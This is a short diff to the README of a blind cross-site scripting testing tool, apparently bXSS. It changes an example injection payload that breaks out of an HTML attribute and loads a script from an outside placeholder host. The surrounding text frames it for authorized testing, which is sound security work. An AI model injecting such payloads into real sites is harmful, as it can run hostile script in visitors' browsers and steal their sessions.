@@ -65,7 +65,7 @@ bXSS will:
 Once the application is funcitonal, you would just identify sites you are authorized to test and start to inject different payloads that will attempt to load your resource, the easiest example is:
 
 ```
-"><script src="https://example.com">
+"><script src="https://example.com/m">
 ````
 
 The application has three core functions
